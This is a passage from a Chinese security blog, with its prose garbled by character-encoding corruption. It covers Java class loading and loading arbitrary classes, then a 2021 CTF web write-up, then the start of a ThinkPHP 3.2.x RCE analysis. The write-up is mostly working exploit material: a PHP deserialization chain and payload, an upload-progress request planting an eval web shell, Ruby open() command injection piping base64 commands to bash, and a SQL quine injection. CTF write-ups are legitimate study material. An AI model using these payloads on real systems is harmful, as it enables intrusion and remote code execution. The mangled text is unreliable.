è½½ï¼ŒéªŒè¯ï¼Œå‡†å¤‡ï¼Œè§£æï¼Œåˆå§‹åŒ–,ä½¿ç”¨,å¸è½½è¿™7ä¸ªé˜¶æ®µ.å…¶ä¸­å…¶ä¸­éªŒè¯ã€å‡†å¤‡ã€è§£æ3ä¸ªéƒ¨åˆ†ç»Ÿç§°ä¸ºè¿æ¥\nåŠ è½½ï¼šæŸ¥æ‰¾å¹¶åŠ è½½ç±»çš„äºŒè¿›åˆ¶æ•°æ® éªŒè¯ï¼šç¡®ä¿è¢«åŠ è½½çš„ç±»çš„æ­£ç¡®æ€§ å‡†å¤‡ï¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ è§£æï¼šæŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ åˆå§‹åŒ–ï¼šå¯¹ç±»çš„é™æ€å˜é‡ï¼Œé™æ€ä»£ç å—æ‰§è¡Œåˆå§‹åŒ–æ“ä½œ ä½¿ç”¨ï¼šç±»è®¿é—®æ–¹æ³•åŒºå†…çš„æ•°æ®ç»“æ„çš„æ¥å£ï¼Œ å¯¹è±¡æ˜¯HeapåŒºçš„æ•°æ®ã€‚ å¸è½½ ç±»åŠ è½½å™¨ è™šæ‹Ÿæœºè®¾è®¡å›¢é˜ŸæŠŠç±»åŠ è½½é˜¶æ®µä¸­çš„â€œé€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è·å–æè¿°æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµâ€è¿™ä¸ªåŠ¨ä½œæ”¾åˆ°Javaè™šæ‹Ÿæœºå¤–éƒ¨å»å®ç°ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºè‡ªå·±å†³å®šå¦‚ä½•å»è·å–æ‰€éœ€è¦çš„ç±»ã€‚ å®ç°è¿™ä¸ªåŠ¨ä½œçš„ä»£ç æ¨¡å—ç§°ä¸ºâ€œç±»åŠ è½½å™¨â€ã€‚\nç±»åŠ è½½çš„ä¸‰ç§æ–¹å¼ å‘½ä»¤è¡Œå¯åŠ¨åº”ç”¨æ—¶å€™ç”±JVMåˆå§‹åŒ–åŠ è½½ é€šè¿‡Class.forName()æ–¹æ³•åŠ¨æ€åŠ è½½ é€šè¿‡ClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ .classå’ŒgetClass()ä½¿ç”¨ä¹‹å‰ç±»å‡å·²åŠ è½½å®Œæ¯•\nç±»åŠ è½½æœºåˆ¶ ç±»çš„åŒäº²å§”æ´¾æœºåˆ¶\nåŒäº²å§”æ´¾æ¨¡å‹çš„å·¥ä½œè¿‡ç¨‹æ˜¯ï¼šå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„ç±»åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„åŠ è½½è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»å®ŒæˆåŠ è½½ã€‚\nå¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader) è¿™ä¸ªç±»å°†å™¨è´Ÿè´£å°†å­˜æ”¾åœ¨ï¼œJAVA_HOMEï¼\\libç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢«-Xbootclasspathå‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„ï¼Œå¹¶ä¸”æ˜¯è™šæ‹Ÿæœºè¯†åˆ«çš„ï¼ˆæŒ‰ç…§æ–‡ä»¶åè¯†åˆ«ï¼Œå¦‚rt.jarã€tools.jarï¼Œåå­—ä¸ç¬¦åˆçš„ç±»åº“å³ä½¿æ”¾åœ¨libç›®å½•ä¸­ä¹Ÿä¸ä¼šè¢«åŠ è½½ï¼‰ç±»åº“åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ã€‚\næ‰©å±•ç±»åŠ è½½å™¨(Extension ClassLoader) è¿™ä¸ªåŠ è½½å™¨ç”±sun.misc.Launcher$ExtClassLoaderå®ç°ï¼Œå®ƒè´Ÿè´£åŠ è½½ï¼œJAVA_HOMEï¼\\lib\\extç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢«java.ext.dirsç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨æ‰©å±•ç±»åŠ è½½å™¨ã€‚\nåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨(Application ClassLoader) è¿™ä¸ªç±»åŠ è½½å™¨ç”±sun.misc.Launcher$AppClassLoaderæ¥å®ç°ã€‚ç”±äºåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨æ˜¯ClassLoaderç±»ä¸­çš„getSystem-ClassLoader()æ–¹æ³•çš„è¿”å›å€¼ï¼Œæ‰€ä»¥æœ‰äº›åœºåˆä¸­ä¹Ÿç§°å®ƒä¸ºâ€œç³»ç»Ÿç±»åŠ è½½å™¨â€ã€‚\nå®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æœ‰çš„ç±»åº“ï¼Œå¼€å‘è€…åŒæ ·å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è¿‡è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªå°±æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚\næˆ‘ä»¬çš„åº”ç”¨ç¨‹åºéƒ½æ˜¯ç”±è¿™3ç§ç±»åŠ è½½å™¨äº’ç›¸é…åˆè¿›è¡ŒåŠ è½½çš„ï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œè¿˜å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚\nä¸¾ä¾‹å¦‚ä¸‹ï¼š å½“AppClassLoaderåŠ è½½ä¸€ä¸ªclassæ—¶ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠç±»åŠ è½½è¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ExtClassLoaderå»å®Œæˆã€‚ å½“ExtClassLoaderåŠ è½½ä¸€ä¸ªclassæ—¶ï¼Œå®ƒé¦–å…ˆä¹Ÿä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠç±»åŠ è½½è¯·æ±‚å§”æ´¾ç»™BootStrapClassLoaderå»å®Œæˆã€‚ å¦‚æœBootStrapClassLoaderåŠ è½½å¤±è´¥(ä¾‹å¦‚åœ¨$JAVA_HOME/jre/libé‡ŒæœªæŸ¥æ‰¾åˆ°è¯¥class)ï¼Œä¼šä½¿ç”¨ExtClassLoaderæ¥å°è¯•åŠ è½½ï¼› è‹¥ExtClassLoaderä¹ŸåŠ è½½å¤±è´¥ï¼Œåˆ™ä¼šä½¿ç”¨AppClassLoaderæ¥åŠ è½½ï¼Œå¦‚æœAppClassLoaderä¹ŸåŠ è½½å¤±è´¥ï¼Œåˆ™ä¼šæŠ¥å‡ºå¼‚å¸¸ClassNotFoundExceptionã€‚ ç±»åŠ è½½ä¸ä»£ç æ‰§è¡Œ JVMåˆå§‹åŒ–åŠ è½½ åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—\nå®ä¾‹åŒ–ï¼šæ„é€ ä»£ç å—ã€æ— å‚æ„é€ å‡½æ•°\nåŠ¨æ€åŠ è½½ Class.fornameï¼šåˆå§‹åŒ–/ä¸åˆå§‹åŒ–çš†å¯\nClassLoader.loadClassï¼šä¸è¿›è¡Œåˆå§‹åŒ–\nåŠ è½½ä»»æ„ç±» åŠ è½½è‡ªå·±çš„æ¶æ„ç±»ï¼Œæ‹“å±•æ”»å‡»é¢\nåˆ†æ 1 2 ç»§æ‰¿å…³ç³»ï¼š ClassLoader-\u0026gt;SecureClassLoader-\u0026gt;URLClassLoader-\u0026gt;AppClassLoader 1 2 è°ƒç”¨é“¾ï¼š loadClass-\u0026gt;findClass-\u0026gt;defineClass åˆ©ç”¨ URLClassLoaderä»»æ„ç±»åŠ è½½:file/http/jar\n1 2 3 4 5 // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file:///C:\\\\tmp\\\\\u0026#34;)}); // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://localhost:8888/\u0026#34;)}); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;jar:file:///C:\\\\tmp\\\\Hello.jar!/\u0026#34;)}); Class\u0026lt;?\u0026gt; c1 = urlClassLoader.loadClass(\u0026#34;Hello\u0026#34;); c1.newInstance(); ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±»\n1 2 3 4 Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;C:\\\\tmp\\\\Hello.class\u0026#34;)); defineClassMethod.invoke(systemClassLoader,\u0026#34;Hello\u0026#34;,code,0,code.length); mavenè¸©å‘ ä¸­æ–‡å®˜ç½‘ä¸‹è½½jdkçš„é“¾æ¥æœ‰é—®é¢˜ï¼Œéœ€è¦å»è‹±æ–‡å®˜ç½‘æ‰æ­£å¸¸ åªæœ‰ä½¿ç”¨ideaè‡ªå¸¦çš„mavenæ‰å¯ä»¥download sourceï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼šSources not found for: commons-collections:commons-collections:3.2.1 å‚è€ƒ ç™½æ—¥æ¢¦ç»„é•¿çš„ä¸ªäººç©ºé—´_å“”å“©å“”å“©_bilibili\n(2æ¡æ¶ˆæ¯) javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¨è®²è§£_mocas_wangçš„åšå®¢-CSDNåšå®¢_javaåºåˆ—åŒ–è®²è§£\nè°ˆè°ˆJavaåå°„ï¼šä»å…¥é—¨åˆ°å®è·µï¼Œå†åˆ°åŸç† - æ˜é‡‘ (juejin.cn)\nå…³äºJVMç±»åŠ è½½æœºåˆ¶ï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº† - æ˜é‡‘ (juejin.cn)\n","date":"2021-12-12T15:53:17+08:00","permalink":"https://k1te.cn/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","title":"Javaååºåˆ—åŒ–åŸºç¡€"},{"content":"èººäº†\nWebFTP æ ¹æ®æŒ‡çº¹æ‰¾åˆ°äº†githubä¸Šçš„æºç ï¼šwifeat/WebFTP\né»˜è®¤çš„å¯†ç admin888æ— æ³•ç™»å½•ï¼Œè´¦æˆ·ä¿¡æ¯å­˜åœ¨Data/User/md5(username).phpä¸­ï¼Œä»ä»£ç é€»è¾‘ä¸Šçœ‹ä¸å‡ºä»€ä¹ˆæ¼æ´\nå‘ç°Readmeç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ¢é’ˆï¼Œåˆšå¼€å§‹è¿›å»å››å¤„ç‚¹ ç‚¹ä¸å‡ºä¸œè¥¿ï¼Œç„¶åçœ‹äº†ä¸‹æºç å‘ç°æäº¤actå‚æ•°å³å¯æ‹¿åˆ°phpinfoï¼Œç„¶åflagåœ¨phpinfoé‡Œè¾¹\npayloadï¼š/Readme/mytz.php?act=phpinfo\npklovecloud (ä¸æ˜¯å¾ˆæ‡‚é¢˜ç›®â€œpklovecloudâ€æ˜¯å•¥æ„æ€ã€‚ã€‚ã€‚\nç›´æ¥ç»™æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class pkshow { function echo_name() { return \u0026#34;Pk very safe^.^\u0026#34;; } } class acp { protected $cinder; public $neutron; public $nova; function __construct() { $this-\u0026gt;cinder = new pkshow; } function __toString() { if (isset($this-\u0026gt;cinder)) return $this-\u0026gt;cinder-\u0026gt;echo_name(); } } class ace { public $filename; public $openstack; public $docker; function echo_name() { $this-\u0026gt;openstack = unserialize($this-\u0026gt;docker); $this-\u0026gt;openstack-\u0026gt;neutron = $heat; if($this-\u0026gt;openstack-\u0026gt;neutron === $this-\u0026gt;openstack-\u0026gt;nova) { $file = \u0026#34;./{$this-\u0026gt;filename}\u0026#34;; if (file_get_contents($file)) { return file_get_contents($file); } else { return \u0026#34;keystone lost~\u0026#34;; } } } } if (isset($_GET[\u0026#39;pks\u0026#39;])) { $logData = unserialize($_GET[\u0026#39;pks\u0026#39;]); echo $logData; } else { highlight_file(__file__); } ?\u0026gt; è¿™é‡Œä¸»è¦æ˜¯æœ‰ä¸ªæœªçŸ¥çš„$heatå˜é‡ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨globalå…³é”®å­—çš„è¯æ˜¯å–ä¸åˆ°å¼€å¤´includeåˆ°æœ¬æ–‡ä»¶ä¸­çš„å˜é‡ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯nullï¼Œæˆ‘ä»¬ç›´æ¥ç½®ç©ºå³å¯\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class acp { protected $cinder; public $neutron ; public $nova ; function __construct($cinder) { $this-\u0026gt;cinder = $cinder; } } class ace { public $filename = \u0026#34;flag.php\u0026#34;; public $openstack; public $docker; function __construct($docker) { $this-\u0026gt;docker = $docker; } } $cp = new acp(\u0026#34;123\u0026#34;); $ce = new ace(serialize($cp)); echo urlencode(serialize(new acp($ce))); ?\u0026gt; payload:O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3BO%3A3%3A\u0026quot;ace\u0026quot;%3A3%3A%7Bs%3A8%3A\u0026quot;filename\u0026quot;%3Bs%3A8%3A\u0026quot;flag.php\u0026quot;%3Bs%3A9%3A\u0026quot;openstack\u0026quot;%3BN%3Bs%3A6%3A\u0026quot;docker\u0026quot;%3Bs%3A69%3A\u0026quot;O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3Bs%3A3%3A\u0026quot;123\u0026quot;%3Bs%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\u0026quot;%3B%7Ds%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\nEasyCleanup é¢˜ç›®å¥½åƒä¸‹åˆçš„æ—¶å€™è¢«æ…å±äº†ï¼Œè¿˜å¯¼è‡´æ¯”èµ›è¢«è¿«æš‚åœï¼ˆxs\nç›´æ¥ç»™æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php if(!isset($_GET[\u0026#39;mode\u0026#39;])){ highlight_file(__file__); }else if($_GET[\u0026#39;mode\u0026#39;] == \u0026#34;eval\u0026#34;){ $shell = $_GET[\u0026#39;shell\u0026#39;] ?? \u0026#39;phpinfo();\u0026#39;; if(strlen($shell) \u0026gt; 15 | filter($shell) | checkNums($shell)) exit(\u0026#34;hacker\u0026#34;); eval($shell); } if(isset($_GET[\u0026#39;file\u0026#39;])){ if(strlen($_GET[\u0026#39;file\u0026#39;]) \u0026gt; 15 | filter($_GET[\u0026#39;file\u0026#39;])) exit(\u0026#34;hacker\u0026#34;); include $_GET[\u0026#39;file\u0026#39;]; } function filter($var): bool{ $banned = [\u0026#34;while\u0026#34;, \u0026#34;for\u0026#34;, \u0026#34;\\$_\u0026#34;, \u0026#34;include\u0026#34;, \u0026#34;env\u0026#34;, \u0026#34;require\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;`\u0026#34;]; foreach($banned as $ban){ if(strstr($var, $ban)) return True; } return False; } function checkNums($var): bool{ $alphanum = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $cnt = 0; for($i = 0; $i \u0026lt; strlen($alphanum); $i++){ for($j = 0; $j \u0026lt; strlen($var); $j++){ if($var[$j] == $alphanum[$i]){ $cnt += 1; if($cnt \u0026gt; 8) return True; } } } return False; } ?\u0026gt; æŸ¥çœ‹phpinfoå‘ç°session.upload_progress.cleanupå‚æ•°æ˜¯Offä¸”session.save_pathå‚æ•°ä¸ºç©ºï¼Œå‚è€ƒï¼šsession.upload_progress+LFIå®ç°RCE - ca01h\u0026rsquo;s Blogï¼Œè¿˜ä¸éœ€è¦æ¡ä»¶ç«äº‰ã€‚\nexpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST / HTTP/1.1 Host: 114.115.134.72:32770 Content-Length: 3144 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjyLGZ6hpSLAUXQv6 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=Kk Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; \u0026lt;?php @eval($_POST[k1te]);?\u0026gt; ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;untitled.php\u0026#34; Content-Type: application/octet-stream \u0026lt;?php class ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6-- ç„¶åç›´æ¥è®¿é—®/?file=/tmp/sess_Kkå³å¯\nPNGå›¾ç‰‡è½¬æ¢å™¨ é™„ä»¶ç»™äº†app.rbï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require \u0026#39;sinatra\u0026#39; require \u0026#39;digest\u0026#39; require \u0026#39;base64\u0026#39; get \u0026#39;/\u0026#39; do open(\u0026#34;./view/index.html\u0026#34;, \u0026#39;r\u0026#39;).read() end get \u0026#39;/upload\u0026#39; do open(\u0026#34;./view/upload.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/upload\u0026#39; do unless params[:file] \u0026amp;\u0026amp; params[:file][:tempfile] \u0026amp;\u0026amp; params[:file][:filename] \u0026amp;\u0026amp; params[:file][:filename].split(\u0026#39;.\u0026#39;)[-1] == \u0026#39;png\u0026#39; return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/upload\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + \u0026#39;.png\u0026#39; open(filename, \u0026#39;wb\u0026#39;) { |f| f.write open(params[:file][:tempfile],\u0026#39;r\u0026#39;).read() } \u0026#34;Upload success, file stored at #{filename}\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end get \u0026#39;/convert\u0026#39; do open(\u0026#34;./view/convert.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/convert\u0026#39; do begin unless params[\u0026#39;file\u0026#39;] return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/convert\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end file = params[\u0026#39;file\u0026#39;] unless file.index(\u0026#39;..\u0026#39;) == nil \u0026amp;\u0026amp; file.index(\u0026#39;/\u0026#39;) == nil \u0026amp;\u0026amp; file =~ /^(.+)\\.png$/ return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;dont hack me\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34; end res = open(file, \u0026#39;r\u0026#39;).read() headers \u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#34;text/html; charset=utf-8\u0026#34; \u0026#34;var img = document.createElement(\\\u0026#34;img\\\u0026#34;);\\nimg.src= \\\u0026#34;data:image/png;base64,\u0026#34; + Base64.encode64(res).gsub(/\\s*/, \u0026#39;\u0026#39;) + \u0026#34;\\\u0026#34;;\\n\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end å‚è€ƒï¼šRubyçš„ open å‡½æ•°å¯¼è‡´å‘½ä»¤æ‰§è¡Œ | Yukang\u0026rsquo;s Pageï¼Œæœ‰pingå‘½ä»¤æ³¨å…¥å†…å‘³å„¿äº†ï¼Œå› ä¸ºè¿‡æ»¤äº†..å’Œ/ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç¼–ç ç»•è¿‡\npayloadï¼š\n1 2 3 4 //ls / file=|echo bHMgLw==|base64 -d|bash||1.png //cat /FLA9_wmXLXmOWKLLQkpP0ceIy file=|echo Y2F0IC9GTEE5X3dtWExYbU9XS0xMUWtwUDBjZUl5|base64 -d|bash||1.png yet_another_mysql_injection æ ¹æ®hintæ‹¿åˆ°æºç /?sourceï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php include_once(\u0026#34;lib.php\u0026#34;); function alertMes($mes,$url){ die(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;{$mes}\u0026#39;);location.href=\u0026#39;{$url}\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } function checkSql($s) { if(preg_match(\u0026#34;/regexp|between|in|flag|=|\u0026gt;|\u0026lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|\u0026amp;|;|\\\\\\$|0x|sleep|\\ /i\u0026#34;,$s)){ alertMes(\u0026#39;hacker\u0026#39;, \u0026#39;index.php\u0026#39;); } } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;] != \u0026#39;\u0026#39;) { $username=$_POST[\u0026#39;username\u0026#39;]; $password=$_POST[\u0026#39;password\u0026#39;]; if ($username !== \u0026#39;admin\u0026#39;) { alertMes(\u0026#39;only admin can login\u0026#39;, \u0026#39;index.php\u0026#39;); } checkSql($password); $sql=\u0026#34;SELECT password FROM users WHERE username=\u0026#39;admin\u0026#39; and password=\u0026#39;$password\u0026#39;;\u0026#34;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) { alertMes(\u0026#34;something wrong\u0026#34;,\u0026#39;index.php\u0026#39;); } if ($row[\u0026#39;password\u0026#39;] === $password) { die($FLAG); } else { alertMes(\u0026#34;wrong password\u0026#34;,\u0026#39;index.php\u0026#39;); } } if(isset($_GET[\u0026#39;source\u0026#39;])){ show_source(__FILE__); die; } ?\u0026gt; æœ€åæ³¨å‡ºæ¥å‘ç°åº“é‡Œé¢æ²¡ä¸œè¥¿ï¼Œéœ€è¦åˆ©ç”¨trickä½¿å¾—è¾“å…¥å’Œè¾“å‡ºç›¸ç­‰ï¼Œè¿™é‡Œç›´æ¥æ‹¿é˜Ÿå‹çš„expï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 def quine(data, debug=True): if debug: print(data) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;REPLACE(REPLACE(YY,CHAR(34),CHAR(39)),CHAR(89),YY)\u0026#34;) blob = data.replace(\u0026#39;YY\u0026#39;,\u0026#39;\u0026#34;Y\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) if debug: print(data) return data data = quine(\u0026#34;\u0026#39;UNION/**/SELECT/**/YY/**/AS/**/ZZ#\u0026#34;) print(data) #æ”¹äº†ä¸‹è„šæœ¬ #https://www.shysecurity.com/post/20140705-SQLi-Quine #çœ‹ä¸Šé¢è¿™ç¯‡æ–‡ç«  payload:'UNION/**/SELECT/**/REPLACE(REPLACE('\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#',CHAR(34),CHAR(39)),CHAR(89),'\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#')/**/AS/**/ZZ#\n","date":"2021-09-16T19:47:24+08:00","permalink":"https://k1te.cn/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/","title":"2021ç¬¬äº”ç©ºé—´çº¿ä¸Šweb"},{"content":"å‰æ®µæ—¶é—´æ‰“æ¯”èµ›çš„æ—¶å€™é‡åˆ°äº†Think PHP3.2.x RCEçš„é¢˜ç›®ï¼Œè¿™ä¸ªæ´æ˜¯ä¸Šä¸ªæœˆçˆ†å‡ºæ¥çš„ï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥ã€‚è™½ç„¶3å·²ç»ä¸æ˜¯ä¸»æµç‰ˆæœ¬äº†ï¼Œä½†æ˜¯è€ƒè™‘åˆ°è¿˜æ˜¯æœ‰ä¸å°‘è€çš„ç«™åœ¨ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰ä¸€å®šçš„ä»·å€¼çš„ï¼Œè¿™é‡Œåˆ†æä¸€ä¸‹ã€‚\nåˆ©ç”¨ è¿™é‡Œç”¨çš„æ˜¯Think PHP3.2.5å®Œæ•´ç‰ˆï¼Œå…·ä½“æ¯ä¸ªç‰ˆæœ¬ä¹‹é—´çš„åŒºåˆ«å¯ä»¥çœ‹çœ‹å‚è€ƒé“¾æ¥\nåˆ©ç”¨çš„æ¡ä»¶æ˜¯assignæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå˜é‡å¯æ§ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨indexControllerå†™å…¥demoï¼š\n1 2 3 4 public function index($value=\u0026#39;\u0026#39;){ $this-\u0026gt;assign($value); $this-\u0026gt;display(); } payloadï¼š?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=.\\Application\\Runtime\\Logs\\Home\\21_06_30.log\næœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå†ç»“åˆæŠ¥é”™å†™logæœ€ç»ˆè¾¾åˆ°rceçš„ç›®çš„\nåˆ†æ è¿™é‡Œæˆ‘ä»¬å…ˆä¸åŒ…å«logï¼Œè€Œæ˜¯åŒ…å«config.iniæ¥åˆ†ææ–‡ä»¶åŒ…å«ï¼Œpayloadï¼š\n1 ?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=C://config.ini 